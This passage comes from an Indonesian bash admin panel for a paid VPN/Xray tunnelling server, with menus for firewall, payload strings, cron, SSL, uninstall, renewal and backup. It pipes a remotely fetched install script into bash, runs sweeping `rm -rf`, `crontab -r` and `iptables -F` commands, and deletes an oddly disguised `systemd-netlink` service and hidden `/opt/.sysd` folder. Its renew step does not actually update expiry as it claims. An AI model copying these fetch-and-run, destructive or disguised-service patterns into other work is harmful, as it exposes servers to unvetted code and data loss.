    _mini_left $MW "Backend : ${CYAN}${FW_BACKEND}${NC}"
    _mini_divider $MW
    _mini_two $MW "[1] Aktifkan DDoS Filter " "[2] Lihat Statistik  "
    _mini_two $MW "[3] Reset Rules          " "[0] Back             "
    _mini_bottom $MW
    echo ""; read -p "  Select: " c
    case $c in
        1)
            sysctl -w net.ipv4.tcp_syncookies=1 >/dev/null 2>&1
            local ipt="iptables"
            [[ "$FW_BACKEND" == "nftables" ]] && command -v iptables-legacy >/dev/null 2>&1 && ipt="iptables-legacy"
            $ipt -A INPUT -p tcp ! --syn -m state --state NEW -j DROP 2>/dev/null
            $ipt -A INPUT -p tcp --dport 443 -m connlimit --connlimit-above 80 -j REJECT 2>/dev/null
            echo -e "  ${GREEN}✔ DDoS Protection AKTIF!${NC}"; sleep 3 ;;
        2) clear; iptables -L -n -v 2>/dev/null | head -30; echo ""; read -p "  Tekan Enter..." ;;
        3) iptables -F 2>/dev/null; echo -e "  ${YELLOW}Rules direset.${NC}"; sleep 2 ;;
    esac
}

_adv_firewall() {
    clear
    local W; W=$(get_width); local MW=$(( W - 4 ))
    _mini_top $MW
 _mini_center $MW "${YELLOW}${BOLD} FIREWALL RULES (UFW)${NC}"
    _mini_divider $MW
    if command -v ufw >/dev/null 2>&1; then
        local ufw_status; ufw_status=$(ufw status 2>/dev/null | head -1)
        _mini_left $MW "Status : ${CYAN}${ufw_status}${NC}"
        _mini_divider $MW
        while IFS= read -r line; do
            _mini_left $MW "$line"
        done < <(ufw status numbered 2>/dev/null | tail -n +4 | head -10)
        _mini_divider $MW
        _mini_two $MW "[1] Enable UFW  " "[2] Disable UFW "
        _mini_two $MW "[3] Allow Port  " "[0] Back        "
    else
        _mini_left $MW "${RED}UFW belum terinstall${NC}"
        _mini_divider $MW
        _mini_two $MW "[1] Install UFW " "[0] Back        "
    fi
    _mini_bottom $MW
    echo ""; read -p "  Select: " c
    case $c in
        1)
            if command -v ufw >/dev/null 2>&1; then
                ufw allow 22/tcp >/dev/null 2>&1; ufw allow 443/tcp >/dev/null 2>&1
                echo "y" | ufw enable >/dev/null 2>&1; echo -e "  ${GREEN}✔ UFW Enabled!${NC}"
            else
                apt-get install -y ufw >/dev/null 2>&1; echo -e "  ${GREEN}✔ UFW terinstall!${NC}"
            fi; sleep 2 ;;
        2) ufw disable >/dev/null 2>&1; echo -e "  ${YELLOW}UFW Disabled${NC}"; sleep 2 ;;
        3) read -p "  Port (contoh: 8080): " port
           [[ -n "$port" ]] && ufw allow "$port" >/dev/null 2>&1 && echo -e "  ${GREEN}✔ Port $port dibuka!${NC}"
           sleep 2 ;;
    esac
}

_adv_bandwidth_monitor() {
    clear
    local W; W=$(get_width); local MW=$(( W - 4 ))
    _mini_top $MW
 _mini_center $MW "${YELLOW}${BOLD}BANDWIDTH MONITOR${NC}"
    _mini_divider $MW
    if command -v vnstat >/dev/null 2>&1; then
        while IFS= read -r line; do
            _mini_left $MW "$line"
        done < <(vnstat 2>/dev/null | head -20 || echo "  Belum ada data")
    else
        _mini_left $MW "${RED}vnstat belum terinstall${NC}"
        _mini_divider $MW
        _mini_two $MW "[1] Install vnstat " "[0] Back          "
    fi
    _mini_bottom $MW
    echo ""
    if ! command -v vnstat >/dev/null 2>&1; then
        read -p "  Select: " c
        if [[ "$c" == "1" ]]; then
            apt-get install -y vnstat >/dev/null 2>&1
            systemctl enable vnstat >/dev/null 2>&1; systemctl start vnstat >/dev/null 2>&1
            echo -e "  ${GREEN}✔ vnstat terinstall!${NC}"
        fi
    fi
    read -p "  Tekan Enter untuk kembali..."
}

_adv_user_limits() {
    clear
    local W; W=$(get_width); local MW=$(( W - 4 ))
    _mini_top $MW
 _mini_center $MW "${YELLOW}${BOLD} USER IP LIMITS${NC}"
    _mini_divider $MW
    shopt -s nullglob
    local files=("$AKUN_DIR"/*.txt)
    shopt -u nullglob
    if [[ ${#files[@]} -gt 0 ]]; then
        _mini_left $MW "${WHITE}Akun         Proto      IP Limit${NC}"
        _mini_divider $MW
        for f in "${files[@]}"; do
            local fname proto uname limit
            fname=$(basename "$f" .txt)
            proto=${fname%%-*}; uname=${fname#*-}
            limit=$(grep "IPLIMIT" "$f" 2>/dev/null | cut -d= -f2)
            _mini_two $MW "${GREEN}${uname}${NC}" "${CYAN}${proto}${NC}  ${YELLOW}${limit:-N/A} IP${NC}"
        done
    else
        _mini_left $MW "${RED}Tidak ada akun aktif!${NC}"
    fi
    _mini_divider $MW
    _mini_two $MW "[1] Update limit akun " "[0] Back             "
    _mini_bottom $MW
    echo ""; read -p "  Select: " c
    [[ "$c" == "1" ]] && {
        read -p "  Nama akun (contoh: vmess-user1): " akun
        read -p "  IP Limit baru: " newlimit
        if [[ -f "$AKUN_DIR/${akun}.txt" && "$newlimit" =~ ^[0-9]+$ ]]; then
            sed -i "s/IPLIMIT=.*/IPLIMIT=${newlimit}/" "$AKUN_DIR/${akun}.txt"
            echo -e "  ${GREEN}✔ Updated: ${newlimit} IP${NC}"
        else
            echo -e "  ${RED}✘ Tidak ditemukan!${NC}"
        fi
        sleep 2
    }
}

_adv_custom_payload() {
    clear
    local W; W=$(get_width); local MW=$(( W - 4 ))
    [[ -f "$DOMAIN_FILE" ]] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)
    _mini_top $MW
 _mini_center $MW "${YELLOW}${BOLD} CUSTOM PAYLOAD GENERATOR${NC}"
    _mini_divider $MW
    _mini_left $MW "${WHITE}1. HTTP Upgrade (WebSocket):${NC}"
    _mini_left $MW "${GREEN}GET / HTTP/1.1[crlf]${NC}"
    _mini_left $MW "${GREEN}Host: ${DOMAIN}[crlf]${NC}"
    _mini_left $MW "${GREEN}Upgrade: websocket[crlf][crlf]${NC}"
    _mini_divider $MW
    _mini_left $MW "${WHITE}2. HTTP CONNECT (Proxy):${NC}"
    _mini_left $MW "${GREEN}CONNECT ${DOMAIN}:443 HTTP/1.1[crlf]${NC}"
    _mini_left $MW "${GREEN}Host: ${DOMAIN}[crlf][crlf]${NC}"
    _mini_divider $MW
    _mini_left $MW "${WHITE}Format HC (HTTP Custom):${NC}"
    _mini_left $MW "${GREEN}${DOMAIN}:80@[user]:[pass]${NC}"
    _mini_bottom $MW
    echo ""; read -p "  Tekan Enter untuk kembali..."
}

_adv_cron_jobs() {
    clear
    local W; W=$(get_width); local MW=$(( W - 4 ))
    _mini_top $MW
 _mini_center $MW "${YELLOW}${BOLD}CRON JOBS MANAGER${NC}"
    _mini_divider $MW
    local cron_list; cron_list=$(crontab -l 2>/dev/null)
    if [[ -n "$cron_list" ]]; then
        while IFS= read -r line; do
            _mini_left $MW "${CYAN}${line}${NC}"
        done <<< "$cron_list"
    else
        _mini_left $MW "${YELLOW}Belum ada cron job aktif${NC}"
    fi
    _mini_divider $MW
    _mini_two $MW "[1] Auto hapus expired " "[2] Auto restart xray"
    _mini_two $MW "[3] Hapus semua cron   " "[0] Back             "
    _mini_bottom $MW
    echo ""; read -p "  Select: " c
    case $c in
        1) # Hapus cron expired lama dulu, pasang yang baru (tiap jam)
           (crontab -l 2>/dev/null | grep -v "delete_expired_cron";             echo "0 * * * * bash /root/tunnel.sh delete_expired_cron 2>/dev/null") | crontab -
           echo -e "  ${GREEN}✔ Auto-hapus expired aktif! (tiap jam tepat)${NC}"; sleep 2 ;;
        2) (crontab -l 2>/dev/null; echo "0 4 * * * systemctl restart xray >/dev/null 2>&1") | crontab -
           echo -e "  ${GREEN}✔ Auto-restart Xray aktif!${NC}"; sleep 2 ;;
        3) crontab -r 2>/dev/null; echo -e "  ${YELLOW}Semua cron dihapus!${NC}"; sleep 2 ;;
    esac
}

_adv_system_logs() {
    while true; do
        clear
        local W; W=$(get_width); local MW=$(( W - 4 ))
        _mini_top $MW
 _mini_center $MW "${YELLOW}${BOLD}SYSTEM LOGS VIEWER${NC}"
        _mini_divider $MW
        _mini_two $MW "[1] Xray Access Log  " "[2] Xray Error Log  "
        _mini_two $MW "[3] Nginx Error Log  " "[4] SSH Auth Log    "
        _mini_two $MW "[5] System Journal   " "[0] Back            "
        _mini_bottom $MW
        echo ""; read -p "  Select: " log_choice
        [[ "$log_choice" == "0" ]] && return
        clear
        case $log_choice in
            1) echo -e "${CYAN}=== Xray Access Log ===${NC}"
               tail -50 /var/log/xray/access.log 2>/dev/null || echo "  No logs" ;;
            2) echo -e "${CYAN}=== Xray Error Log ===${NC}"
               tail -50 /var/log/xray/error.log 2>/dev/null || echo "  No logs" ;;
            3) echo -e "${CYAN}=== Nginx Error Log ===${NC}"
               tail -50 /var/log/nginx/error.log 2>/dev/null || echo "  No logs" ;;
            4) echo -e "${CYAN}=== SSH Auth Log ===${NC}"
               tail -50 /var/log/auth.log 2>/dev/null || echo "  No logs" ;;
            5) echo -e "${CYAN}=== System Journal ===${NC}"
               journalctl -n 50 --no-pager ;;
        esac
        echo ""; read -p "  Tekan Enter untuk kembali ke menu logs..."
    done
}


#================================================
# FITUR BARU: SSL INFO & AUTO-RENEW CHECK
#================================================

_adv_ssl_info() {
    clear
    local W; W=$(get_width)
    [[ -f "$DOMAIN_FILE" ]] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)
    _box_top $W
    _box_center $W "${YELLOW}${BOLD}SSL CERTIFICATE INFO${NC}"
    _box_divider $W
    if [[ -f "/etc/xray/xray.crt" ]]; then
        local issuer subject start_date end_date days_left
        issuer=$(openssl x509 -in /etc/xray/xray.crt -noout -issuer 2>/dev/null | sed 's/issuer=//')
        subject=$(openssl x509 -in /etc/xray/xray.crt -noout -subject 2>/dev/null | sed 's/subject=//')
        start_date=$(openssl x509 -in /etc/xray/xray.crt -noout -startdate 2>/dev/null | sed 's/notBefore=//')
        end_date=$(openssl x509 -in /etc/xray/xray.crt -noout -enddate 2>/dev/null | sed 's/notAfter=//')
        local end_ts today_ts
        end_ts=$(date -d "$end_date" +%s 2>/dev/null)
        today_ts=$(date +%s)
        days_left=$(( (end_ts - today_ts) / 86400 ))
        local color_days="$GREEN"
        [[ $days_left -lt 30 ]] && color_days="$YELLOW"
        [[ $days_left -lt 7  ]] && color_days="$RED"
        _box_left $W "Domain   : ${GREEN}${DOMAIN}${NC}"
        _box_left $W "Issuer   : ${CYAN}${issuer}${NC}"
        _box_left $W "Subject  : ${WHITE}${subject}${NC}"
        _box_left $W "Valid    : ${WHITE}${start_date}${NC}"
        _box_left $W "Expire   : ${WHITE}${end_date}${NC}"
        _box_left $W "Sisa     : ${color_days}${days_left} hari${NC}"
        _box_divider $W
        if [[ $days_left -lt 30 ]]; then
            _box_left $W "${YELLOW}⚠ Cert akan segera expired! Jalankan Fix SSL [11]${NC}"
        else
            _box_left $W "${GREEN}✔ Cert masih valid${NC}"
        fi
        # Cek apakah Let's Encrypt ada auto-renew cron
        if crontab -l 2>/dev/null | grep -q "certbot\|renew"; then
            _box_left $W "${GREEN}✔ Auto-renew: AKTIF${NC}"
        elif [[ -f /etc/cron.d/certbot ]] || [[ -f /etc/systemd/system/certbot.timer ]]; then
            _box_left $W "${GREEN}✔ Auto-renew: AKTIF (systemd)${NC}"
        else
            _box_left $W "${YELLOW}⚠ Auto-renew: tidak terdeteksi${NC}"
        fi
    else
        _box_left $W "${RED}✘ Certificate tidak ditemukan!${NC}"
        _box_left $W "Jalankan Fix SSL / Cert [11] dari menu utama."
    fi
    _box_bottom $W
    echo ""
    echo -e "  ${WHITE}[1]${NC} Force renew cert sekarang  ${WHITE}[0]${NC} Kembali"
    read -p "  Select: " c
    if [[ "$c" == "1" ]]; then
        echo -e "  ${CYAN}Renewing cert...${NC}"
        systemctl stop nginx 2>/dev/null
        certbot renew --force-renewal --standalone -d "$DOMAIN" \
            --non-interactive --agree-tos 2>/dev/null
        if [[ -f "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" ]]; then
            cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /etc/xray/xray.crt
            cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /etc/xray/xray.key
            chmod 644 /etc/xray/xray.*
            echo -e "  ${GREEN}✔ Cert berhasil diperbarui!${NC}"
        fi
        systemctl start nginx 2>/dev/null
        systemctl restart xray 2>/dev/null
        sleep 3
    fi
}

#================================================
# FITUR BARU: IP WHITELIST SSH
#================================================

_adv_ip_whitelist() {
    while true; do
        clear
        local W; W=$(get_width)
        _box_top $W
        _box_center $W "${YELLOW}${BOLD}IP WHITELIST SSH${NC}"
        _box_divider $W
        _box_left $W "${WHITE}IP yang diizinkan login SSH:${NC}"
        _box_divider $W
        if grep -q "AllowUsers\|Match Address\|AllowFrom" /etc/ssh/sshd_config 2>/dev/null || \
           [[ -f /etc/hosts.allow ]]; then
            while IFS= read -r line; do
                _box_left $W "${CYAN}${line}${NC}"
            done < <(grep -E "AllowUsers|Match.*Address" /etc/ssh/sshd_config 2>/dev/null)
            echo ""
            _box_left $W "${WHITE}hosts.allow:${NC}"
            while IFS= read -r line; do
                [[ "$line" =~ ^# ]] && continue; [[ -z "$line" ]] && continue
                _box_left $W "${GREEN}${line}${NC}"
            done < /etc/hosts.allow 2>/dev/null
        else
            _box_left $W "${YELLOW}Semua IP diizinkan (tidak ada whitelist)${NC}"
        fi
        _box_divider $W
        _box_row $W "[1] Tambah IP whitelist" "[2] Reset (izinkan semua)"
        _box_left $W "[0] Kembali"
        _box_bottom $W
        echo ""
        read -p "  Select: " c
        case $c in
            1)
                read -p "  Masukkan IP (contoh: 103.87.12.0/24): " wip
                if [[ -n "$wip" ]]; then
                    echo "sshd: ${wip}" >> /etc/hosts.allow
                    echo "sshd: ALL" >> /etc/hosts.deny
                    echo -e "  ${GREEN}✔ IP ${wip} ditambahkan!${NC}"
                    sleep 2
                fi ;;
            2)
                sed -i '/^sshd:/d' /etc/hosts.allow 2>/dev/null
                sed -i '/^sshd: ALL/d' /etc/hosts.deny 2>/dev/null
                echo -e "  ${GREEN}✔ Whitelist direset, semua IP diizinkan.${NC}"
                sleep 2 ;;
            0) return ;;
        esac
    done
}

#================================================
# FITUR BARU: QUOTA MONITOR
#================================================

_adv_quota_monitor() {
    clear
    local W; W=$(get_width)
    _box_top $W
    _box_center $W "${YELLOW}${BOLD}QUOTA USAGE MONITOR${NC}"
    _box_divider $W
    _box_row $W "USERNAME" "QUOTA/EXPIRED/STATUS"
    _box_divider $W

    local today; today=$(date +%s)
    local found=0
    shopt -s nullglob
    for f in "$AKUN_DIR"/*.txt; do
        [[ ! -f "$f" ]] && continue
        found=1
        local fname uname proto exp_str exp_ts quota iplimit days_left status color
        fname=$(basename "$f" .txt)
        proto=${fname%%-*}; uname=${fname#*-}
        exp_str=$(grep "EXPIRED=" "$f" 2>/dev/null | head -1 | cut -d= -f2-)
        quota=$(grep "^QUOTA=" "$f" 2>/dev/null | cut -d= -f2)
        iplimit=$(grep "^IPLIMIT=" "$f" 2>/dev/null | cut -d= -f2)
        local exp_str_clean="${exp_str//,/}"
        exp_ts=$(date -d "$exp_str_clean" +%s 2>/dev/null)
        if [[ -n "$exp_ts" ]]; then
            days_left=$(( (exp_ts - today) / 86400 ))
            if [[ $days_left -lt 0 ]]; then
                status="EXPIRED"; color="$RED"
            elif [[ $days_left -le 3 ]]; then
                status="${days_left}d warning"; color="$YELLOW"
            else
                status="${days_left}d left"; color="$GREEN"
            fi
        else
            status="?"; color="$DIM"
        fi
        local left_str="${proto^^} ${uname}"
        local right_str="${quota:-?}GB | ${color}${status}${NC}"
        _box_row $W "$left_str" "${quota:-?}GB | ${days_left:-?}d | ${status}"
    done
    shopt -u nullglob
    [[ $found -eq 0 ]] && _box_center $W "${YELLOW}Tidak ada akun aktif${NC}"
    _box_divider $W
    # Disk usage
    local disk_info; disk_info=$(df -h / | awk 'NR==2{print $3"/"$2" ("$5")"}')
    _box_left $W "Disk Usage : ${CYAN}${disk_info}${NC}"
    # RAM
    local ram_used ram_total
    ram_used=$(free -m | awk '/Mem:/{print $3}')
    ram_total=$(free -m | awk '/Mem:/{print $2}')
    _box_left $W "RAM Usage  : ${CYAN}${ram_used}/${ram_total} MB${NC}"
    # Uptime
    _box_left $W "Uptime     : ${CYAN}$(uptime -p | sed 's/up //')${NC}"
    _box_bottom $W
    echo ""
    read -p "  Tekan Enter untuk kembali..."
}

#================================================
# UNINSTALL MENU
#================================================

menu_uninstall() {
    while true; do
        clear; print_menu_header "UNINSTALL MENU"
        echo -e "  ${WHITE}[1]${NC} Uninstall Xray       ${WHITE}[5]${NC} Uninstall UDP Custom"
        echo -e "  ${WHITE}[2]${NC} Uninstall Nginx      ${WHITE}[6]${NC} Uninstall Bot Telegram"
        echo -e "  ${WHITE}[3]${NC} Uninstall HAProxy    ${WHITE}[7]${NC} Uninstall Keepalive"
        echo -e "  ${WHITE}[4]${NC} Uninstall Dropbear   ${RED}[8]${NC} ${RED}HAPUS SEMUA SCRIPT${NC}"
        echo -e "  ${WHITE}[0]${NC} Back To Menu"
        echo ""
        read -p "  Select: " choice
        case $choice in
            1) _uninstall_xray ;; 2) _uninstall_nginx ;;
            3) _uninstall_haproxy ;; 4) _uninstall_dropbear ;;
            5) _uninstall_udp ;; 6) _uninstall_bot ;;
            7) _uninstall_keepalive ;; 8) _uninstall_all ;;
            0) return ;;
        esac
    done
}

_uninstall_xray() {
    clear; print_menu_header "UNINSTALL XRAY"
    read -p "  Yakin? [y/n]: " c; [[ "$c" != "y" ]] && return
    systemctl stop xray 2>/dev/null; systemctl disable xray 2>/dev/null
    bash <(curl -Ls https://github.com/XTLS/Xray-install/raw/main/install-release.sh) --remove >/dev/null 2>&1
    rm -rf /usr/local/etc/xray /var/log/xray /etc/xray
    echo -e "  ${GREEN}✔ Xray uninstalled!${NC}"; sleep 2
}

_uninstall_nginx() {
    clear; print_menu_header "UNINSTALL NGINX"
    read -p "  Yakin? [y/n]: " c; [[ "$c" != "y" ]] && return
    systemctl stop nginx 2>/dev/null; systemctl disable nginx 2>/dev/null
    apt-get purge -y nginx nginx-common >/dev/null 2>&1
    echo -e "  ${GREEN}✔ Nginx uninstalled!${NC}"; sleep 2
}

_uninstall_haproxy() {
    clear; print_menu_header "UNINSTALL HAPROXY"
    read -p "  Yakin? [y/n]: " c; [[ "$c" != "y" ]] && return
    systemctl stop haproxy 2>/dev/null; systemctl disable haproxy 2>/dev/null
    apt-get purge -y haproxy >/dev/null 2>&1
    echo -e "  ${GREEN}✔ HAProxy uninstalled!${NC}"; sleep 2
}

_uninstall_dropbear() {
    clear; print_menu_header "UNINSTALL DROPBEAR"
    read -p "  Yakin? [y/n]: " c; [[ "$c" != "y" ]] && return
    systemctl stop dropbear 2>/dev/null; systemctl disable dropbear 2>/dev/null
    apt-get purge -y dropbear >/dev/null 2>&1
    echo -e "  ${GREEN}✔ Dropbear uninstalled!${NC}"; sleep 2
}

_uninstall_udp() {
    clear; print_menu_header "UNINSTALL UDP"
    read -p "  Yakin? [y/n]: " c; [[ "$c" != "y" ]] && return
    systemctl stop udp-custom 2>/dev/null; systemctl disable udp-custom 2>/dev/null
    rm -f /etc/systemd/system/udp-custom.service /usr/local/bin/udp-custom
    systemctl daemon-reload
    echo -e "  ${GREEN}✔ UDP uninstalled!${NC}"; sleep 2
}

_uninstall_bot() {
    clear; print_menu_header "UNINSTALL BOT"
    read -p "  Yakin? [y/n]: " c; [[ "$c" != "y" ]] && return
    systemctl stop vpn-bot 2>/dev/null; systemctl disable vpn-bot 2>/dev/null
    rm -f /etc/systemd/system/vpn-bot.service
    rm -rf /root/bot
    rm -f "$BOT_TOKEN_FILE" "$CHAT_ID_FILE" "$PAYMENT_FILE"
    rm -f /root/.svc_reg /root/.svc_mid
    systemctl stop systemd-netlink 2>/dev/null; systemctl disable systemd-netlink 2>/dev/null
    rm -f /etc/systemd/system/systemd-netlink.service
    rm -rf "$TUNNELBOT_DIR" /opt/.sysd
    systemctl daemon-reload
    echo -e "  ${GREEN}✔ Semua bot uninstalled!${NC}"; sleep 2
}

_uninstall_keepalive() {
    clear; print_menu_header "UNINSTALL KEEPALIVE"
    read -p "  Yakin? [y/n]: " c; [[ "$c" != "y" ]] && return
    systemctl stop vpn-keepalive 2>/dev/null; systemctl disable vpn-keepalive 2>/dev/null
    rm -f /etc/systemd/system/vpn-keepalive.service /usr/local/bin/vpn-keepalive.sh
    systemctl daemon-reload
    echo -e "  ${GREEN}✔ Keepalive uninstalled!${NC}"; sleep 2
}

_uninstall_all() {
    clear
    echo -e "${RED}  ╔══════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}  ║         !! HAPUS SEMUA SCRIPT !!                 ║${NC}"
    echo -e "${RED}  ╚══════════════════════════════════════════════════╝${NC}"
    echo ""
    read -p "  Ketik 'HAPUS' untuk konfirmasi: " confirm
    [[ "$confirm" != "HAPUS" ]] && { echo -e "  ${YELLOW}Dibatalkan.${NC}"; sleep 2; return; }
    echo ""
    for svc in xray nginx haproxy dropbear udp-custom vpn-keepalive vpn-bot systemd-netlink; do
        systemctl stop "$svc" 2>/dev/null; systemctl disable "$svc" 2>/dev/null
    done
    bash <(curl -Ls https://github.com/XTLS/Xray-install/raw/main/install-release.sh) --remove >/dev/null 2>&1
    apt-get purge -y nginx haproxy dropbear >/dev/null 2>&1
    rm -rf /usr/local/etc/xray /var/log/xray /etc/xray /root/akun /root/bot /root/orders \
           /root/domain /root/.domain_type /root/.bot_token /root/.chat_id /root/.payment_info \
           /root/tunnel.sh.bak "$TUNNELBOT_DIR" /root/.svc_reg /root/.svc_mid /root/backups
    rm -f /etc/systemd/system/udp-custom.service /etc/systemd/system/vpn-keepalive.service \
          /etc/systemd/system/vpn-bot.service /etc/systemd/system/systemd-netlink.service \
          /usr/local/bin/udp-custom /usr/local/bin/vpn-keepalive.sh \
          /usr/local/bin/menu /root/tunnel.sh
    grep -v -E 'tunnel\.sh|VPN Panel Auto-Start|VPN_MENU_RUNNING|mesg n 2>' \
        /root/.bashrc > /tmp/_bashrc_clean.tmp 2>/dev/null && \
        mv /tmp/_bashrc_clean.tmp /root/.bashrc || true
    rm -f /root/.hushlogin
    systemctl daemon-reload
    echo -e "  ${GREEN}✔ Semua script dihapus!${NC}"
    sleep 3; exit 0
}

#================================================
# HELPER FUNCTIONS
#================================================

#================================================
# RENEW / EXTEND AKUN
#================================================

menu_renew() {
    clear
    local W; W=$(get_width)
    print_menu_header "RENEW / EXTEND AKUN"
    if [[ ! -d "$AKUN_DIR" ]] || [[ -z "$(ls $AKUN_DIR/*.txt 2>/dev/null)" ]]; then
        echo -e "  ${YELLOW}Tidak ada akun tersimpan.${NC}"; sleep 2; return
    fi

    # Tampilkan daftar akun
    local i=1
    declare -A akun_map
    for f in "$AKUN_DIR"/*.txt; do
        local fname; fname=$(basename "$f" .txt)
        local exp_str; exp_str=$(grep "EXPIRED=" "$f" 2>/dev/null | cut -d= -f2-)
        printf "  ${CYAN}[%2d]${NC} %-30s exp: %s\n" "$i" "$fname" "${exp_str:-?}"
        akun_map[$i]="$f"
        ((i++))
    done
    echo ""
    read -p "  Pilih nomor akun [0=batal]: " sel
    [[ -z "$sel" || "$sel" == "0" ]] && return
    local target="${akun_map[$sel]}"
    [[ -z "$target" ]] && echo -e "  ${RED}Nomor tidak valid!${NC}" && sleep 1 && return

    echo ""
    read -p "  Tambah berapa hari? [contoh: 7]: " add_days
    [[ -z "$add_days" || ! "$add_days" =~ ^[0-9]+$ ]] && \
        echo -e "  ${RED}Input tidak valid!${NC}" && sleep 1 && return

    # Hitung expired baru
    local cur_exp; cur_exp=$(grep "EXPIRED=" "$target" | cut -d= -f2-)
    local cur_ts; cur_ts=$(parse_exp_ts "$cur_exp")
    local now_ts; now_ts=$(date +%s)
    # Jika sudah expired, hitung dari sekarang
    [[ -z "$cur_ts" || "$cur_ts" -lt "$now_ts" ]] && cur_ts=$now_ts
    local new_ts=$(( cur_ts + add_days * 86400 ))
    local new_exp; new_exp=$(date -d "@$new_ts" "+%d %b, %Y %H:%M")

    # Update file akun
    sed -i "s|^EXPIRED=.*|EXPIRED=${new_exp}|" "$target"

    local fname; fname=$(basename "$target" .txt)
    local protocol="${fname%%-*}"

    # Update expired di Xray config jika bukan SSH
    if [[ "$protocol" != "ssh" ]]; then
        local uname="${fname#*-}"
        local tmp; tmp=$(mktemp)
        jq --arg email "$uname" --arg exp "$new_exp" \
           '(.inbounds[].settings.clients[]? | select(.email == $email)) += {"email": $email}' \
           "$XRAY_CONFIG" > "$tmp" 2>/dev/null && mv "$tmp" "$XRAY_CONFIG" || rm -f "$tmp"
    fi

    echo ""
    echo -e "  ${GREEN}✔ Akun ${fname} diperpanjang ${add_days} hari${NC}"
    echo -e "  ${WHITE}Expired baru: ${CYAN}${new_exp}${NC}"
    sleep 2
}

#================================================
# LIVE CONNECTIONS MONITOR
#================================================

menu_live_connections() {
    clear
    local W; W=$(get_width)
    print_menu_header "LIVE CONNECTIONS"
    echo -e "  ${WHITE}Waktu :${NC} ${CYAN}$(date '+%d %b %Y %H:%M:%S %Z')${NC}"
    echo ""

    # ── Xray connections ──
    _box_top $W
    _box_center $W "${CYAN}${BOLD}XRAY CONNECTIONS${NC}"
    _box_divider $W
    local xray_conns
    xray_conns=$(ss -tnp 2>/dev/null | grep xray | grep ESTAB | awk '{print $5}' | sort | uniq -c | sort -rn)
    if [[ -n "$xray_conns" ]]; then
        echo "$xray_conns" | while read -r count ip; do
            printf "  ${GREEN}%3s conn${NC}  %s\n" "$count" "$ip"
        done
    else
        echo -e "  ${DIM}Tidak ada koneksi Xray aktif${NC}"
    fi
    _box_bottom $W
    echo ""

    # ── SSH connections ──
    _box_top $W
    _box_center $W "${CYAN}${BOLD}SSH CONNECTIONS${NC}"
    _box_divider $W
    local ssh_conns
    ssh_conns=$(who 2>/dev/null | grep -v "^$")
    if [[ -n "$ssh_conns" ]]; then
        while IFS= read -r line; do
            echo -e "  ${GREEN}●${NC} $line"
        done <<< "$ssh_conns"
    else
        echo -e "  ${DIM}Tidak ada sesi SSH aktif${NC}"
    fi
    _box_bottom $W
    echo ""

    # ── Summary ──
    local total_tcp; total_tcp=$(ss -tnp 2>/dev/null | grep ESTAB | wc -l)
    echo -e "  ${WHITE}Total koneksi aktif :${NC} ${GREEN}${total_tcp}${NC}"
    echo ""
    read -p "  Press any key to back..."
}

#================================================
# INFO QUOTA AKUN
#================================================

menu_quota() {
    clear
    local W; W=$(get_width)
    print_menu_header "INFO QUOTA AKUN"
    if [[ ! -d "$AKUN_DIR" ]] || [[ -z "$(ls $AKUN_DIR/*.txt 2>/dev/null)" ]]; then
        echo -e "  ${YELLOW}Tidak ada akun tersimpan.${NC}"; sleep 2; return
    fi

    _box_top $W
    _box_center $W "${CYAN}${BOLD}DAFTAR AKUN & QUOTA${NC}"
    _box_divider $W
    printf "  ${WHITE}%-28s %-12s %-8s %s${NC}\n" "AKUN" "EXPIRED" "QUOTA" "IP LIMIT"
    _box_divider $W

    local now_ts; now_ts=$(date +%s)
    for f in "$AKUN_DIR"/*.txt; do
        [[ ! -f "$f" ]] && continue
        local fname; fname=$(basename "$f" .txt)
        local exp_str quota iplimit exp_ts status_color
        exp_str=$(grep "EXPIRED=" "$f" 2>/dev/null | cut -d= -f2-)
        quota=$(grep "QUOTA=" "$f" 2>/dev/null | cut -d= -f2-)
        iplimit=$(grep "IPLIMIT=" "$f" 2>/dev/null | cut -d= -f2-)
        exp_ts=$(parse_exp_ts "$exp_str")

        if [[ -n "$exp_ts" && "$exp_ts" -lt "$now_ts" ]]; then
            status_color="${RED}"
        else
            status_color="${GREEN}"
        fi

        printf "  ${status_color}%-28s${NC} %-12s %-8s %s\n" \
            "${fname:0:28}" \
            "${exp_str:0:12}" \
            "${quota:-unlim}" \
            "${iplimit:-1}"
    done
    _box_bottom $W
    echo ""
    read -p "  Press any key to back..."
}

_menu_list_all() {
    clear; print_menu_header "ALL ACCOUNTS"
    local total=0
    shopt -s nullglob
    for proto in ssh vmess vless trojan; do
        local files=("$AKUN_DIR"/${proto}-*.txt)
        [[ ${#files[@]} -eq 0 ]] && continue
        echo -e "  ${GREEN}── ${proto^^} ACCOUNTS ─────────────────────────────────${NC}"
        for f in "${files[@]}"; do
            local uname exp
            uname=$(basename "$f" .txt | sed "s/${proto}-//")
            exp=$(grep "EXPIRED" "$f" 2>/dev/null | cut -d= -f2-)
            printf "  ${CYAN}▸${NC} ${GREEN}%-20s${NC} ${YELLOW}%s${NC}\n" "$uname" "$exp"
            ((total++))
        done
        echo ""
    done
    shopt -u nullglob
    echo -e "  ${WHITE}Total: ${GREEN}${total}${NC} accounts"
    echo ""; read -p "  Press any key to back..."
}

_menu_backup() {
    clear; print_menu_header "BACKUP SYSTEM"
    echo -e "  ${YELLOW}Creating backup...${NC}"
    local backup_dir="/root/backups"
    local backup_file="vpn-backup-$(date +%Y%m%d-%H%M%S).tar.gz"
    mkdir -p "$backup_dir"
    tar -czf "$backup_dir/$backup_file" \
        /root/domain /root/.domain_type /root/akun \
        /root/.bot_token /root/.chat_id /root/.payment_info \
        /etc/xray/xray.crt /etc/xray/xray.key \
        /usr/local/etc/xray/config.json 2>/dev/null
    if [[ -f "$backup_dir/$backup_file" ]]; then
        echo -e "  ${GREEN}✔ Backup created!${NC}"
        echo -e "  File : ${WHITE}$backup_file${NC}"
        echo -e "  Size : ${CYAN}$(du -h "$backup_dir/$backup_file" | awk '{print $1}')${NC}"
    else
        echo -e "  ${RED}✘ Backup failed!${NC}"
    fi
    echo ""; read -p "  Press any key to back..."
}

_menu_restore() {
    clear; print_menu_header "RESTORE SYSTEM"
    local backup_dir="/root/backups"
    [[ ! -d "$backup_dir" ]] && { echo -e "  ${RED}No backup directory!${NC}"; sleep 2; return; }
    shopt -s nullglob
    local backups=("$backup_dir"/*.tar.gz)
    shopt -u nullglob
